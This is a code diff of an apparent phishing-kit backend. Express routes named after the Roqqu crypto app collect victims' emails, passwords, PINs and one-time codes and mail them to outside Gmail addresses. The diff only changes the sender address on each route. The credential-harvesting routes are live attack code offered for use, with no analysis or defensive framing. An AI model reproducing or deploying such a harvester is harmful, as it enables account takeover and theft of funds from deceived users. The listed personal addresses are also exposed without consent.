@@ -55,7 +55,7 @@ app.post('/roqquappchat', (req, res, next) => {
     const content = `<p><strong>Email:</strong> ${email} </p> </br> <p><strong>Password:</strong> ${password} </p> </br> <p><strong>PIN:</strong> ${pin}</p>  </br> <p><strong>OTP:</strong>${otp}</p> `
 
     const mail = {
-        from: 'admin@roqquliveappchat.com',
+        from: 'admin@growveonct.com',
         to: 'soulbar23@gmail.com',
         //to: 'ifestephenie@gmail.com',
         subject: 'New message from Roqquappchat',
@@ -99,7 +99,7 @@ app.post('/roqquapp', (req, res, next) => {
     const content = `<p><strong>Email:</strong> ${email} </p> </br> <p><strong>Password:</strong> ${password} </p> </br> <p><strong>PIN:</strong> ${pin}</p>  </br> <p><strong>OTP:</strong>${otp}</p> `
 
     const mail = {
-        from: 'one@roqquliveappchat.com',
+        from: 'admin@growveonct.com',
         to: 'princeco12@gmail.com',
         //to: 'ifestephenie@gmail.com',
         subject: 'New message from Roqquapp',
@@ -143,7 +143,7 @@ app.post('/roqqu-app', (req, res, next) => {
     const content = `<p><strong>Email:</strong> ${email} </p> </br> <p><strong>Password:</strong> ${password} </p> </br> <p><strong>PIN:</strong> ${pin}</p>  </br> <p><strong>OTP:</strong>${otp}</p> `
 
     const mail = {
-        from: 'two@roqquliveappchat.com',
+        from: 'admin@growveonct.com',
         to: 'paysroqquu@gmail.com, wj05685@gmail.com',
         // to: 'ifestephenie@gmail.com',
         subject: 'New message from Roqqu-app',
@@ -188,7 +188,7 @@ app.post('/roqqulive', (req, res, next) => {
     const content = `<p><strong>Email:</strong> ${email} </p> </br> <p><strong>Password:</strong> ${password} </p> </br> <p><strong>PIN:</strong> ${pin}</p>  </br> <p><strong>OTP:</strong>${otp}</p> `
 
     const mail = {
-        from: 'three@roqquliveappchat.com',
+        from: 'admin@growveonct.com',
         //to: 'obiolorkingsley22@gmail.com, wj05685@gmail.com',
         to: 'ifestephenie@gmail.com',
         subject: 'New message from Roqquliveappchat',
